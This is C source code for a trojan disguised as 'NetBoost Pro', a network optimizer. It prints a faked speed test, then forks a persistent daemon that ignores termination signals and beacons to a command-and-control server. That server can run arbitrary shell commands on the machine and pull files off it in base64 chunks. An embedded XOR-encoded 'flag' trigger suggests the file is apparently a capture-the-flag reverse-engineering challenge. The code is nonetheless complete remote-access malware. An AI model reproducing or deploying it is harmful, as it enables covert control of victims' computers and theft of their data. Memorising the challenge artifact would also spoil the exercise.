#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>
#include <sys/types.h>
#include <errno.h>
#include <stdint.h>

#define PACKET_SIZE 8192
#define CHUNK_SIZE 1536  // Reduced to allow for base64 expansion and headers
#define C2_SERVER "X.X.X.X"  // Change this to your C2 server IP
#define C2_PORT 8443  // Disguised as HTTPS alternative port
#define C2_MAGIC "C2_"  // Magic prefix for C2 traffic
#define BEACON_INTERVAL 30  // seconds

// Global variables for background operation
int sockfd;
time_t last_beacon = 0;
int background_mode = 0;

// Function declarations
int base64_encode(const unsigned char* input, int input_len, char* output, int output_size);

void send_tcp_message(int sockfd, const char* message) {
    char c2_payload[PACKET_SIZE];
    snprintf(c2_payload, sizeof(c2_payload), "%s%s", C2_MAGIC, message);
    
    uint32_t length = htonl(strlen(c2_payload));
    
    // Send length first, then data
    if (send(sockfd, &length, sizeof(length), 0) < 0) {
        if (!background_mode) perror("Failed to send message length");
        return;
    }
    
    if (send(sockfd, c2_payload, strlen(c2_payload), 0) < 0) {
        if (!background_mode) perror("Failed to send message");
        return;
    }
}

char* receive_tcp_message(int sockfd) {
    static char buffer[PACKET_SIZE];
    uint32_t length;
    
    // Receive length first
    int bytes_received = recv(sockfd, &length, sizeof(length), MSG_WAITALL);
    if (bytes_received <= 0) {
        return NULL;
    }
    
    length = ntohl(length);
    if (length >= PACKET_SIZE) {
        return NULL;
    }
    
    // Receive the actual message
    bytes_received = recv(sockfd, buffer, length, MSG_WAITALL);
    if (bytes_received <= 0) {
        return NULL;
    }
    
    buffer[length] = '\0';
    return buffer;
}

char* run_system_command(const char* command) {
    FILE *fp;
    static char result[2048];
    char temp[256];

    memset(result, 0, sizeof(result));

    fp = popen(command, "r");
    if (fp == NULL) {
        strcpy(result, "Error: Failed to execute command");
        return result;
    }

    while (fgets(temp, sizeof(temp), fp) != NULL) {
        if (strlen(result) + strlen(temp) < sizeof(result) - 1) {
            strcat(result, temp);
        }
    }

    pclose(fp);

    if (strlen(result) == 0) {
        strcpy(result, "Command executed (no output)");
    }

    return result;
}

// Base64 encoding function
int base64_encode(const unsigned char* input, int input_len, char* output, int output_size) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int output_len = 0;
    
    if (output_size < ((input_len + 2) / 3) * 4 + 1) {
        return -1; // Output buffer too small
    }
    
    for (int i = 0; i < input_len; i += 3) {
        uint32_t octet_a = i < input_len ? input[i] : 0;
        uint32_t octet_b = i + 1 < input_len ? input[i + 1] : 0;
        uint32_t octet_c = i + 2 < input_len ? input[i + 2] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        output[output_len++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        output[output_len++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        output[output_len++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        output[output_len++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    int mod = input_len % 3;
    if (mod == 1) {
        output[output_len - 2] = '=';
        output[output_len - 1] = '=';
    } else if (mod == 2) {
        output[output_len - 1] = '=';
    }
    
    output[output_len] = '\0';
    return output_len;
}

void handle_file_transfer(int sockfd, const char* filename) {
    FILE *fp;
    struct stat file_stat;
    char chunk_data[PACKET_SIZE];  // Use full packet size for chunk data
    char buffer[CHUNK_SIZE];
    char encoded_buffer[CHUNK_SIZE * 2];  // Buffer for base64 encoding
    int chunk_num = 1;
    int total_chunks;
    
    if (stat(filename, &file_stat) != 0) {
        send_tcp_message(sockfd, "DOWNLOAD_ERROR:File not found");
        return;
    }
    
    if (!S_ISREG(file_stat.st_mode)) {
        send_tcp_message(sockfd, "DOWNLOAD_ERROR:Not a regular file");
        return;
    }
    
    fp = fopen(filename, "rb");
    if (fp == NULL) {
        send_tcp_message(sockfd, "DOWNLOAD_ERROR:Cannot open file");
        return;
    }
    
    total_chunks = (file_stat.st_size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    if (total_chunks == 0) total_chunks = 1;
    
    // Send file metadata first
    char metadata[512];
    snprintf(metadata, sizeof(metadata), "DOWNLOAD_START:%s:%ld:%d", 
             filename, file_stat.st_size, total_chunks);
    send_tcp_message(sockfd, metadata);
    
    int chunk_sent_count = 0;
    while (chunk_sent_count < total_chunks) {
        int bytes_read = fread(buffer, 1, CHUNK_SIZE, fp);
        
        if (bytes_read <= 0) {
            break;
        }
        
        // Base64 encode the binary data
        int encoded_len = base64_encode((unsigned char*)buffer, bytes_read, encoded_buffer, sizeof(encoded_buffer));
        if (encoded_len < 0) {
            send_tcp_message(sockfd, "DOWNLOAD_ERROR:Encoding failed");
            break;
        }
        
        // Create chunk message with base64 data
        // Check if the message will fit in our buffer
        int header_len = snprintf(NULL, 0, "DOWNLOAD_CHUNK:%d:%d:%d:", chunk_num, total_chunks, bytes_read);
        if (header_len + encoded_len >= PACKET_SIZE - 50) {
            send_tcp_message(sockfd, "DOWNLOAD_ERROR:Chunk too large");
            break;
        }
        
        snprintf(chunk_data, sizeof(chunk_data), "DOWNLOAD_CHUNK:%d:%d:%d:%s", 
                 chunk_num, total_chunks, bytes_read, encoded_buffer);
        
        send_tcp_message(sockfd, chunk_data);
        
        chunk_num++;
        chunk_sent_count++;
        
        usleep(50000); // 50ms delay between chunks
    }
    
    send_tcp_message(sockfd, "DOWNLOAD_COMPLETE");
    fclose(fp);
}

inline char* __attribute__((always_inline)) decrypt_flag(void) {

	char* key = "\xc4\x25\x1a\x1e\x9d\xdd\x4a\x6e\x2f\xe6\x2d\xf6\x29\x1a\xc0\x81\xb4\x93\x86\xfe\x86\x1f\x57\x49\x48\x61\xdc\x7f\x4a\xb3\x98\xf3\x84\xe9";
	char* enc = "\xa2\x49\x7b\x79\xe6\xbb\x7a\x1b\x41\x82\x72\x82\x41\x29\x9f\xe9\x85\xf7\xe2\xcd\xe8\x40\x34\x7b\x17\x07\xef\x4b\x3e\xc6\xea\xc0\xa5\x94";
	char* flag = malloc(35);
	for (int i = 0; i < 34; i++) {
		flag[i] = key[i] ^ enc[i];
	}
	flag[34] = 0;
	return flag;
}

void process_server_command(int sockfd) {
    char* message = receive_tcp_message(sockfd);
    if (!message) {
        // Connection lost
        if (!background_mode) printf("Connection to server lost\n");
        exit(1);
    }
    
    // Check for C2 magic prefix
    if (strncmp(message, C2_MAGIC, 3) == 0) {
        const char* command = message + 3; // Skip "C2_" prefix

        if (strncmp(command, "BEACON", 6) == 0 || strlen(command) == 0) {
            return;
        }

        if (strncmp(command, "DOWNLOAD:", 9) == 0) {
            char *filename = (char*)command + 9;
            while (*filename == ' ' || *filename == '\t') filename++;
            handle_file_transfer(sockfd, filename);
            return;
        }

		{
			int i = 0;
			char* flagpls = "\x04\x0e\x03\x05\x12\x0e\x11";
			for (int x = 0; x < 7; x++) {
				if ((command[x] ^ 0x42) == flagpls[x]) {
					i++;
				}
			}
			
			if (i == 7) {
				char *flag = decrypt_flag();
				char flag_response[256];
				snprintf(flag_response, sizeof(flag_response), "%s", flag);
				send_tcp_message(sockfd, flag_response);
				return;
			}

		}

        // Execute regular command
        char *response = run_system_command(command);
        send_tcp_message(sockfd, response);
    }
}

void send_beacon(int sockfd) {
    send_tcp_message(sockfd, "BEACON");
    last_beacon = time(NULL);
}

int connect_to_server() {
    struct sockaddr_in server_addr;
    int sock;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    
    if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

void network_optimization_daemon() {
    background_mode = 1;
    
    while (1) {
        sockfd = connect_to_server();
        if (sockfd < 0) {
            sleep(10); // Wait 10 seconds before retry
            continue;
        }
        
        // Send initial beacon
        send_beacon(sockfd);
        
        fd_set read_fds;
        struct timeval timeout;
        
        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(sockfd, &read_fds);
            
            timeout.tv_sec = BEACON_INTERVAL;
            timeout.tv_usec = 0;
            
            int ready = select(sockfd + 1, &read_fds, NULL, NULL, &timeout);
            
            if (ready < 0) {
                // Error in select
                break;
            } else if (ready > 0) {
                // Data available from server
                if (FD_ISSET(sockfd, &read_fds)) {
                    process_server_command(sockfd);
                }
            } else {
                // Timeout - send beacon
                time_t now = time(NULL);
                if (now - last_beacon >= BEACON_INTERVAL) {
                    send_beacon(sockfd);
                }
            }
        }
        
        close(sockfd);
        sleep(5); // Wait before reconnecting
    }
}

void run_speed_test() {
    printf("NetBoost Pro v2.1.3\n");
    printf("============================\n\n");
    
    printf("Analyzing network configuration...");
    fflush(stdout);
    sleep(2);
    printf(" OK\n");
    
    printf("Testing connection latency...");
    fflush(stdout);
    sleep(1);
    printf(" 12ms\n");
    
    printf("Measuring bandwidth capacity...");
    fflush(stdout);
    sleep(3);
    printf(" 156.7 Mbps\n");
    
    printf("Optimizing TCP window scaling...");
    fflush(stdout);
    sleep(2);
    printf(" ENHANCED\n");
    
    printf("Adjusting DNS resolution cache...");
    fflush(stdout);
    sleep(1);
    printf(" OPTIMIZED\n");
    
    printf("Configuring network buffer sizes...");
    fflush(stdout);
    sleep(2);
    printf(" TUNED\n");
    
    printf("\nOptimization complete! Your network performance has been improved.\n");
    printf("Estimated speed increase: 23.4%%\n");
    printf("Background monitoring enabled for continuous optimization.\n\n");
}

void signal_handler(int sig) {
    // Ignore signals to keep background process running
}

int main(int argc, char *argv[]) {
    // Set up signal handlers
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGHUP, signal_handler);

    // Check if we should run in background mode
    if (argc > 1 && strcmp(argv[1], "--daemon") == 0) {
        network_optimization_daemon();
        return 0;
    }

    // Run the legitimate-looking speed test
    run_speed_test();

    // Fork background process for "network optimization"
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - run in background
        setsid(); // Create new session
        
        // Close standard file descriptors
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        
        // Restart as daemon
        execl(argv[0], argv[0], "--daemon", (char *)NULL);
        exit(1);
    } else if (pid > 0) {
        // Parent process - exit normally
        printf("Network optimization service started in background.\n");
        exit(0);
    } else {
        // Fork failed - try to run daemon directly
        network_optimization_daemon();
    }

    return 0;
}
